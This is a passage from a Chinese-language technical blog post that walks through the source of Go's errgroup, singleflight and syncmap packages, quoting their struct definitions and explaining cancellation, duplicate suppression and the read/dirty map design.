<code>wg.Wait()</code>，当这个函数返回时就代表所有的子 goroutine 都结束执行了。</p><p>上面这个场景用代码表示的话，大概是这个样子：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">wg := <span class="built_in">new</span>(sync.WaitGroup)</span><br><span class="line"></span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">goRecover()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">goRecover()</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">// do something</span></span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br></pre></td></tr></table></figure><p>上面的代码有什么问题呢？首先，每个子 goroutine 都有一个 <code>wg.Add(1)</code> 和 <code>wg.Done()</code>，尽管可以只做一次 <code>wg.Add(n)</code>，但使用者需要正确地维护 <code>wg.Add</code> 和 <code>wg.Done</code> 的对应关系，如果 <code>wg.Add</code> 大于 <code>wg.Done</code>，那么 <code>wg.Wait</code> 就会卡死，反过来则会导致 panic；另一方面，子 goroutine 内部有可能会产生错误，但原生 wg 并不感知各个子 goroutine 是否正常结束，它甚至不感知子 goroutine 的存在；除此之外，除了 <code>wg.Wait</code>，各个 goroutine 并没有什么联系，原生 wg 并不能做到类似 “某个 goroutine 发生错误时就终止其他 goroutine” 的功能。</p><p>而这些在 errgroup 下都可以得到解决。errgroup 提供了一个名为 Group 的结构，该结构的定义是这样的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// A Group is a collection of goroutines working on subtasks that are part of</span></span><br><span class="line"><span class="comment">// the same overall task.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A zero Group is valid, has no limit on the number of active goroutines,</span></span><br><span class="line"><span class="comment">// and does not cancel on error.</span></span><br><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> &#123;</span><br><span class="line">cancel <span class="function"><span class="keyword">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">wg</span> <span class="title">sync</span>.<span class="title">WaitGroup</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">sem</span> <span class="title">chan</span> <span class="title">token</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">errOnce</span> <span class="title">sync</span>.<span class="title">Once</span></span></span><br><span class="line"><span class="function"><span class="title">err</span>     <span class="title">error</span></span></span><br><span class="line"><span class="function">&#125;</span></span><br></pre></td></tr></table></figure><p>可以看到在这个结构体中除 cancel 和 sem 外所有的字段都不是指针，而从我们后面的描述中就可以看到， 这两个字段并不是一定要有值才行。所以就像这个结构的注释一样，我们完全可以使用一个零值的 Group，因为此时强依赖的字段都已经是可使用的状态了。</p><p>和 wg 不同，Group 是感知子 goroutine 的存在的，它提供了 Go 和 TryGo 方法来做这件事。我们先看 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L66-L84" target="_blank" rel="noopener">Go 方法</a> ，此时先认为 cancel 和 sem 都为 nil，那么 Go 方法的定义就变得非常简单，它仅仅包装了 <code>wg.Add(1)</code>  和 <code>wg.Done()</code> 的过程，使用者此时便不再需要手动维护这两者的关系，只需要关注 <code>func() error</code> 内部的逻辑即可。而一旦这个作为入参的函数返回了错误，即 err 不为 nil，那么 Group 就会将这个返回的 err 赋值给内部的 err 字段。由于在赋值时使用了 errOnce，所以最终 Group.err 如果不为 nil，那么它就会是所有子 goroutine 中发生的第一个错误。</p><p>但 Group.err 的首字母是小写的，所以我们并没有办法直接访问这个变量，而是要用 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L52-L58" target="_blank" rel="noopener">Group.Wait</a> 方法。该方法是 wg.Wait 的封装，在此基础上将 Group.err 返回，所以使用者就可以借此访问到子 goroutine 中的错误了。</p><p>到此为止，零值的 Group 已经解决了我们前面说的三个问题中的两个，那么最后一个问题要通过什么来解决呢？我们可以维护一个 channel，所有的子 goroutine 都在 select 中尝试从这个 channel 中读取或做实际的业务逻辑，一旦有某个 goroutine 遇到错误，就 close 这个 channel，那么其他的 goroutine 都会从这个 channel 中读取到内容，从而结束后序逻辑。</p><p>但是 Group 不是这样做的，它采用了 golang 中一个更接近应用场景的思维模式的工具，也就是 context。</p><p>我们前面讨论 Group 的基本功能时，是假设 cancel 和 sem 都是 nil 的。但如果 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L78-L80" target="_blank" rel="noopener">cancel 不为 nil</a>，那么就可以做到当一个 goroutine 出错时，其他 goroutine 都提前返回的功能。Group 提供了 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L45-L48" target="_blank" rel="noopener">WithContext 方法</a> ，该方法调用 <code>context.WithCancel</code> 来包装外部传递的 ctx，并返回新的 ctx，这样这个新的 ctx 就可以以闭包的方式被 Group.Go 的入参函数所使用。</p><p>除了这些功能外，errgroup 还提供了限制并发数量的功能，该功能通过 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L123-L132" target="_blank" rel="noopener">SetLimit 方法</a> 来实现。该方法接收一个整型数字作为最大并发度，该数字如果大于零，那么会作为 sem 这个 channel 的长度。Group.sem 的类型是 <code>chan token</code>，而 token 的定义是 <code>type token struct{}</code>。之所以要用 <code>struct{}</code>，是因为实际 Group 并不关注 sem 中保存的是什么，它只需要使用 sem 作为 channel 天然所拥有的阻塞能力，所以设置成 <code>struct{}</code> 就可以节省空间，因为该类型本身并不占用内存。errgroup 的限流采用了漏桶算法的思想，具体而言，如果 sem 不为 nil，那么 <code>Group.Go</code> 在执行前会尝试向 sem 写入一个 token，如果此时 sem 中保存的 token 已经达到了 <code>Group.SetLimit</code> 所设置的长度，那么新的写入会被阻塞直到 sem 内的某个 token 被释放。而 token 正是在 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L33-L38" target="_blank" rel="noopener">Group.done 方法</a> 中被释放的，该方法在 <code>Group.Go</code> 的入参函数执行完成时就会被调用。</p><p>最后，Group 还提供了 <a href="https://github.com/golang/sync/blob/master/errgroup/errgroup.go#L90-L114" target="_blank" rel="noopener">TryGo 方法</a> 来让使用方感知是否被限流。该方法和 Group.Go 方法的区别在于向 sem 中写入 token 的部分，通过 select-default 的方式来“浅尝辄止”：如果 <code>g.sem &lt;- token{}</code> 的部分不能成功，那么 select 会走到 default 的部分，并在这部分返回 false 表示因为被限流导致没能成功启动子 goroutine。</p><h1 id="singleflight"><a href="#singleflight" class="headerlink" title="singleflight"></a>singleflight</h1><blockquote><p>源码：<a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go" target="_blank" rel="noopener">https://github.com/golang/sync/blob/master/singleflight/singleflight.go</a></p></blockquote><p>singleflight 提供了一种名为 “duplicate suppression” 的能力，这种能力非常适合用来处理缓存回源问题。举例来说，假设我们在应用中维护了一份 localcache，当用户通过发起请求来根据某个 key 获取对应的值时，应用首先在 localcache 中寻找，如果没有找到则回源到存储层中去寻找，并将找到的值或空值写回 localcache 以在下一次请求时避免回源。</p><p>在这个场景下，回源这个节点就成为了关键节点，因为当应用具备一定的并发量时，很有可能在同一时间会有多个针对同一个 key 的请求，而它们在读取 localcache 时均会发现其中没有自己需要的数据，从而进行回源，这时这些请求都会被漏放到存储层，从而使其瞬时压力升高，极端情况下可能会导致存储不可用。但实际上，这些发生在同一时间的回源请求读取存储时拿到的结果都是相同的，所以我们完全没必要将所有的请求都放到存储层。</p><p>这些不必要的回源请求，其实就是 duplicate 的，而 singleflight 要做的就是把这些不必要的请求拦截，只允许其中一个请求发生，其他请求直接读取这个请求返还的结果。</p><p>在 singleflight 包中，核心结构有如下三个：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// call is an in-flight or completed singleflight.Do call</span></span><br><span class="line"><span class="keyword">type</span> call <span class="keyword">struct</span> &#123;</span><br><span class="line">wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="comment">// These fields are written once before the WaitGroup is done</span></span><br><span class="line"><span class="comment">// and are only read after the WaitGroup is done.</span></span><br><span class="line">val <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">err error</span><br><span class="line"></span><br><span class="line"><span class="comment">// These fields are read and written with the singleflight</span></span><br><span class="line"><span class="comment">// mutex held before the WaitGroup is done, and are read but</span></span><br><span class="line"><span class="comment">// not written after the WaitGroup is done.</span></span><br><span class="line">dups  <span class="keyword">int</span></span><br><span class="line">chans []<span class="keyword">chan</span>&lt;- Result</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Group represents a class of work and forms a namespace in</span></span><br><span class="line"><span class="comment">// which units of work can be executed with duplicate suppression.</span></span><br><span class="line"><span class="keyword">type</span> Group <span class="keyword">struct</span> &#123;</span><br><span class="line">mu sync.Mutex       <span class="comment">// protects m</span></span><br><span class="line">m  <span class="keyword">map</span>[<span class="keyword">string</span>]*call <span class="comment">// lazily initialized</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Result holds the results of Do, so they can be passed</span></span><br><span class="line"><span class="comment">// on a channel.</span></span><br><span class="line"><span class="keyword">type</span> Result <span class="keyword">struct</span> &#123;</span><br><span class="line">Val    <span class="keyword">interface</span>&#123;&#125;</span><br><span class="line">Err    error</span><br><span class="line">Shared <span class="keyword">bool</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而这三个中，Group 又占主导位置，singleflight 提供的功能函数都要通过这个结构来调用。从代码中的注释可以看出，Group.m 是延迟初始化的，而 Group.mu 是一个值类型，所以和 errgroup.Group 相同，这个 Group 同样可以直接使用零值来完成一系列的功能。</p><p>首先，最核心的方法便是 <a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go#L82-L106" target="_blank" rel="noopener">Group.Do 方法</a>，这个方法的一开始就通过 Group.mu 进行了加锁处理，而解锁部分有两处，分别对应两类 goroutine 进入这个方法的路径。区分这两类路径的核心在于 <code>if c, ok := g.m[key]; ok {</code> 这里，因为加了锁，所以这里不存在并发读的问题。如果这个 key 是第一次被使用，那么此时 g.m 中是不存在这个 key 的，所以此时会生成一个 call 结构并将其添加到 g.m 中，然后将 c.wg 通过 Add 增加 1 后调用 g.doCall 来尝试根据入参的 <code>fn func() (interface{}, error)</code> 获取结果。另一方面，如果这个 key 后续被其他 goroutine 使用时，前面提到的 if 就可以根据这个 key 从 g.m 中取出对应的 call，以从中直接获取结果。</p><p>我们先简单地将 doCall 理解为获取结果的方式，那么整个 singleflight 过程中有两点比较重要，首先是其他 goroutine 怎样才能知道这个 call 中的结果已经准备好了；另一方面，如果准备好了，负责 g.doCall 的 goroutine 是怎么把结果送给其他 goroutine 的。</p><p>从 Group 的定义中可以发现，Group.m 是一个 string 到 *call（指针） 的 map，这意味着不论哪个 goroutine 根据 key 从 Group.m 中拿到 call 结构都是同一个，所以任意一个 goroutine 对它的修改都能被其他 goroutine 所感知，这就解决了结果传递的问题，因为只要负责 g.doCall 的 goroutine 将结果写入 call.val 和 call.err，其他 goroutine 就可以从同一个 call 中读取这两个字段的结果。而前文所述的第一个问题也有很多解法（比如我们前面提到过的 close(channel) 的方法），不过在 singleflight 这个包中，是通过 WaitGroup 来实现的。具体而言，负责 g.doCall 的 goroutine 会对 call.wg 结构执行 Add 方法，而其他 goroutine 则对 call.wg 结构执行 Wait 方法。这样一旦 call.wg 的 Done 方法被调用，那么所有的 call.wg.Wait 都会返回，而由于 Done 是在 <a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go#L149" target="_blank" rel="noopener">doCall 结束时</a> 被调用的，所以此时其他 goroutine 就已经可以从 call.val 和 call.err 中拿到 doCall 的结果了。</p><p>同时，为了让使用者感知到是否有多个 goroutine 使用了同一个 call 结构，singleflight 在 call 中还维护了 dups 字段，该字段在 Group.Do 流程进入前文所述的 if 中时<a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go#L88" target="_blank" rel="noopener">会被加一</a>，所以只要在 Group.Do 返回时判断下 call.dups 是否大于 0 即可得知。</p><p>我个人认为 singleflight 对 WaitGroup 的应用还蛮有趣的，通常而言我对它的定位都是多个 goroutine 做 wg.Add 和 wg.Done，一个 goroutine 做 wg.Wait，而这里则是反过来的，通过多个 Wait 来实现多个 goroutine 等待一个 goroutine 的效果，这也说明了 wg.Wait 是幂等的。</p><p>和 Group.Do 方法类似，<a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go#L112-L132" target="_blank" rel="noopener">Group.DoChan 方法</a> 也提供了 singleflight 的能力，只不过执行的结果是以 <code>&lt;- chan Result</code> 的方式返回的，从 Result 结构的定义可以看到，这个结构描述的其实就是 Group.Do 的返回值。所以 Group.DoChan 和 Group.Do 在原理上是基本相同的，唯一的区别在于结果的处理上，为了实现异步返回，Group.doCall 是以 goroutine 的方式来调用的，而每个请求 Group.DoChan 的 goroutine 都对应一个 <code>&lt;- chan Result</code> 结构，被保存在 call.chans 中，Group.doCall 会在获取到结果后依次将结果填充进 call.chans 中的每个元素中。这样 Group.DoChan 并不需要依赖 call.wg 来做 goroutine 间的结果同步，因为当 Group.doCall 结束时每个 goroutine 对应的 chan 中都能直接获取到结果。</p><p>所以由于 Group.m 这个 map 的存在，所有使用同样 key 的 goroutine 都可以从相同的 call 结构中获取到同一份结果。但是如果某个 key 一直存在于 Group.m 中，后续的所有针对这个 key 的 goroutine 都会不经过入参的 fn 的计算而直接从 call 中拿到旧的结果，这显然是不符合预期的，所以 key 一定是要被清理的。在 singleflight 中，<a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go#L150-L152" target="_blank" rel="noopener">Group.doCall 方法</a> 会自动做 key 的清理，可以看到这里先判断了 <code>Group.m[key]</code> 是否是预期删除的 call，之所以这里要这样做，是因为 singleflight 还提供了 Group.Forget 方法来让使用者主动删除 Group.m 中的某个 key，而一旦这个方法被调用，紧随其后的第一个请求同一个 key 的 goroutine 就会向 Group.m 中填充新的 call 并再次调用 Group.doCall，此时 <code>Group.m[key]</code> 对于上一个调用 Group.doCall 的 goroutine 来说就是不该删除的了，因为现在的 call 与它毫无关系。</p><p>那么 Group.m 中某个 key 对应的 call 结构发生变化，是否会影响使用前一个 call 的那些 goroutine 们呢？答案是不会，因为它们在自己的函数栈中都创建了 c 变量，也就是上一个 call 的指针，就算其他的 goroutine 修改了 Group.m，这个 c 变量还是指向原来的 call 结构。我个人认为 singleflight 对 Group.m 的运用是非常有趣的，它在保存了旧 call 引用的同时还决定了当前的 goroutine 是否需要做 Group.doCall，非常棒。</p><p>除了删除 Group.m 中的 key，Group.doCall 主要做的就是调用入参的 fn，然后把结果填充进 call 中的 val、err、chans，这些在前面我们都已经讨论过了。除此之外，Group.doCall 还区分了 fn 内部是否发生了 panic 或 <code>runtime.Goexit</code>，这里做得也很巧妙，是用两个 defer 来做的，函数 <a href="https://github.com/golang/sync/blob/master/singleflight/singleflight.go#L193-L195" target="_blank" rel="noopener">最下面的代码</a> 在 <code>runtime.Goexit</code> 时不会被执行，但 panic 却会执行，利用这一点就区分出了两种情况。</p><h1 id="syncmap"><a href="#syncmap" class="headerlink" title="syncmap"></a>syncmap</h1><blockquote><p>源码：<a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go" target="_blank" rel="noopener">https://github.com/golang/sync/blob/master/syncmap/pre_go19.go</a></p></blockquote><p>如前所述，syncmap 在 go1.9 时已经进入了标准库，所以我认为应该大多数的 gopher 都使用过这个工具。在 syncmap 中，核心的结构体有如下三个：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Map is a concurrent map with amortized-constant-time loads, stores, and deletes.</span></span><br><span class="line"><span class="comment">// It is safe for multiple goroutines to call a Map's methods concurrently.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The zero Map is valid and empty.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// A Map must not be copied after first use.</span></span><br><span class="line"><span class="keyword">type</span> Map <span class="keyword">struct</span> &#123;</span><br><span class="line">mu sync.Mutex</span><br><span class="line"></span><br><span class="line"><span class="comment">// read contains the portion of the map's contents that are safe for</span></span><br><span class="line"><span class="comment">// concurrent access (with or without mu held).</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// The read field itself is always safe to load, but must only be stored with</span></span><br><span class="line"><span class="comment">// mu held.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Entries stored in read may be updated concurrently without mu, but updating</span></span><br><span class="line"><span class="comment">// a previously-expunged entry requires that the entry be copied to the dirty</span></span><br><span class="line"><span class="comment">// map and unexpunged with mu held.</span></span><br><span class="line">read atomic.Value <span class="comment">// readOnly</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// dirty contains the portion of the map's contents that require mu to be</span></span><br><span class="line"><span class="comment">// held. To ensure that the dirty map can be promoted to the read map quickly,</span></span><br><span class="line"><span class="comment">// it also includes all of the non-expunged entries in the read map.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Expunged entries are not stored in the dirty map. An expunged entry in the</span></span><br><span class="line"><span class="comment">// clean map must be unexpunged and added to the dirty map before a new value</span></span><br><span class="line"><span class="comment">// can be stored to it.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If the dirty map is nil, the next write to the map will initialize it by</span></span><br><span class="line"><span class="comment">// making a shallow copy of the clean map, omitting stale entries.</span></span><br><span class="line">dirty <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]*entry</span><br><span class="line"></span><br><span class="line"><span class="comment">// misses counts the number of loads since the read map was last updated that</span></span><br><span class="line"><span class="comment">// needed to lock mu to determine whether the key was present.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Once enough misses have occurred to cover the cost of copying the dirty</span></span><br><span class="line"><span class="comment">// map, the dirty map will be promoted to the read map (in the unamended</span></span><br><span class="line"><span class="comment">// state) and the next store to the map will make a new dirty copy.</span></span><br><span class="line">misses <span class="keyword">int</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// readOnly is an immutable struct stored atomically in the Map.read field.</span></span><br><span class="line"><span class="keyword">type</span> readOnly <span class="keyword">struct</span> &#123;</span><br><span class="line">m       <span class="keyword">map</span>[<span class="keyword">interface</span>&#123;&#125;]*entry</span><br><span class="line">amended <span class="keyword">bool</span> <span class="comment">// true if the dirty map contains some key not in m.</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// An entry is a slot in the map corresponding to a particular key.</span></span><br><span class="line"><span class="keyword">type</span> entry <span class="keyword">struct</span> &#123;</span><br><span class="line"><span class="comment">// p points to the interface&#123;&#125; value stored for the entry.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If p == nil, the entry has been deleted and m.dirty == nil.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// If p == expunged, the entry has been deleted, m.dirty != nil, and the entry</span></span><br><span class="line"><span class="comment">// is missing from m.dirty.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Otherwise, the entry is valid and recorded in m.read.m[key] and, if m.dirty</span></span><br><span class="line"><span class="comment">// != nil, in m.dirty[key].</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// An entry can be deleted by atomic replacement with nil: when m.dirty is</span></span><br><span class="line"><span class="comment">// next created, it will atomically replace nil with expunged and leave</span></span><br><span class="line"><span class="comment">// m.dirty[key] unset.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// An entry's associated value can be updated by atomic replacement, provided</span></span><br><span class="line"><span class="comment">// p != expunged. If p == expunged, an entry's associated value can be updated</span></span><br><span class="line"><span class="comment">// only after first setting m.dirty[key] = e so that lookups using the dirty</span></span><br><span class="line"><span class="comment">// map find the entry.</span></span><br><span class="line">p unsafe.Pointer <span class="comment">// *interface&#123;&#125;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中最核心的就是 Map 这个结构，可以看到出了 Map.dirty 外其他的字段均是值类型，所以这个结构的零值也是可以直接被使用的。在 Map 中有 read 和 dirty 两个字段，其中 read 以 atomic.Value 的方式保存 readOnly 这个结构，可以看到 readOnly 中的 m 与 dirty 一样都是 <code>map[interface{}]*entry</code> 类型，而这里就是最终保存 k-v 映射关系的地方。</p><p>为什么要保存两份呢？很大程度上是为了效率，如果使用得当的话，大多数的读写请求都不需要依赖 Map.mu 这个锁来完成。具体来说，readOnly.m 的读写是通过 atomic 标准库提供的 Load/Store/CompareAndSwap 来做的，虽然我没有深入研究过这些操作的实现，但由于 sync.Mutex 和 sync.RWMutex 是通过 atomic 标准库来实现的，所以 atomic 一定是比 sync 标准库中的锁要高效的。</p><p>我个人觉得 readOnly 这个名字起得不好，因为它实际上是有写操作的，但 readOnly.m 仅仅是一个普通的 map，在并发读写时如果不加锁，golang 应该会检测到并报错退出才对。事实上，对于一个新的 key 而言，readOnly.m 并不存在类似 <code>readOnly.m[key] = val</code> 这样直接写入的操作，只会 <a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L133-L135" target="_blank" rel="noopener">对已经存在的 key 做更新操作</a>，而这种操作并不会命中 golang map 的并发检测。对于那些新的 key，<a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L155" target="_blank" rel="noopener">写入操作都只会发生在 dirty 中</a>，所以在读取时如果 readOnly.m 中没有找到，就需要 <a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L108" target="_blank" rel="noopener">到 dirty 中去尝试寻找</a>。但是如果 readOnly.m 中没有需要的 key，也不是一定要去 dirty 中读取，这是通过 readOnly.amended 来实现的，当且仅当 <a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L153" target="_blank" rel="noopener">dirty 中拥有 readOnly.m 中不存在的 key 时，这个字段才为 true</a>。</p><p>通过阅读操作 dirty 的代码就会发现，它真的就只是一个普通的 map，而且存在向其中新增 key 的情况，这就不可避免地要在读写时进行加锁（也就是 Map.mu），而相较于使用 atomic 的 readOnly.m，这就变得非常低效了。所以 dirty 会在一定情况下升级为 readOnly.m，这是通过 <a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L338-L346" target="_blank" rel="noopener">Map.misssLocked 函数</a> 来做的，在这个函数中会先增加 Map.misses 字段的值（函数被调用前加了锁，所以不会有并发增加的现象），当该字段的值大于等于 dirty 的长度时，就会执行升级操作。而这个函数只会在读取 dirty 时才会被调用，这样整体看来，就是每次读操作从 readOnly.m 穿透到 dirty 时就会算做一次 miss，而 miss 的次数大于等于 dirty 的长度时，就会将 dirty 升级为 readOnly，升级后的读操作相较于之前就会有所好转，因为新的 readOnly 拥有比之前更多的数据。</p><p>回到 readOnly.m 上，这个结构会经历的操作就只有读、更新以及替换整个 map，但是 Map.missLocked 函数在做完 readOnly 的升级后就 <a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L344" target="_blank" rel="noopener">将 dirty 设置为 nil</a>，那么当使用者继续向 dirty 中添加新的 key 时，dirty 中不就只有这些新添加的 key 了吗？如果读取这些新的 key 使 miss 达到阈值后发生升级，那么 readOnly 中原来的 key 不就消失了？事实上，当使用者 <a href="https://github.com/golang/sync/blob/master/syncmap/pre_go19.go#L149-L154" target="_blank" rel="noopener">向值为 nil 的 dirty 中添加新的 key 时</a>（也就是 readOnly.amended 为 false），会调用 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L348-L360" target="_blank" rel="noopener">Map.dirtyLocked 函数</a>。可以发现，这个函数从 readOnly 中复制了所有值不为 nil 和 expunged 的 k-v（这里先不管这两种值的含义，后面讨论删除时会提到），所以此时 dirty 既包含 readOnly.m 中 “有效” 的 k-v，也包含新的 k-v，这样在升级时就不会丢失曾经的 key 了。同时，而由于 readOnly.m 和 dirty 中的值都是指针，所以实际上它们是共享同一份内存的，这一方面减小了空间开销，一方面又保证了一处的修改在另一处也能感知。</p><p>我们再来看看删除操作，也就是 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L265-L281" target="_blank" rel="noopener">Map.Delete 函数</a>。这个函数的思路比较简单，如果 readOnly.m 中没有要删除的 key 而 readOnly.amended 为 true，那么 dirty 中就 “可能” 有要删除的 key，但是具体有没有，syncmap 并不关心，它直接就对 dirty 使用了 <code>delete(m.dirty, key)</code>，但这没有什么问题，因为用 delete 尝试从 map 中删除一个不存在 key 并不会报错。而如果 readOnly.m 中存在要被删除的 key，那么就会将其标记为 nil，这个 nil 在 dirty 被初始化时会在 readOnly.m 中 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L365" target="_blank" rel="noopener">被替换成 expunged</a>，而且不会出现在被初始化的 dirty 中。所以正如 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L71-L77" target="_blank" rel="noopener">注释</a> 中所描述的，nil 和 expunged 都表示某个 key 被删除，如果 readOnly.m 中被删除的 key 表示为 nil，那么说明此时 dirty 为 nil，如果被删除的 key 表示为 expunged，那么 dirty 就不为 nil（不过如果硬要说的话，其实 <a href="https://github.com/golang/sync/blob/8fcdb60fdcc0539c5e357b2308249e4e752147f1/syncmap/pre_go19.go#L140-L145" target="_blank" rel="noopener">这里</a> 在e.unexpungeLocked 结束后 e.storeLocked 执行前对应的 key 就是 nil，此时 dirty 也不为 nil，不过只是一瞬间 :-P）。</p><p>所以对于删除这个操作而言，如果被删除的 key 在 readOnly.m 中可以被找到，那么这个删除其实是惰性的，它仅仅只是将 key 对应的值设置为 nil，直到 dirty 发生升级时，readOnly.m 整个被不存在这个 key 的 dirty 替换掉，这个删除才真正发生。在此之前，key 实际是存在于 readOnly.m 中的，只是读取时会 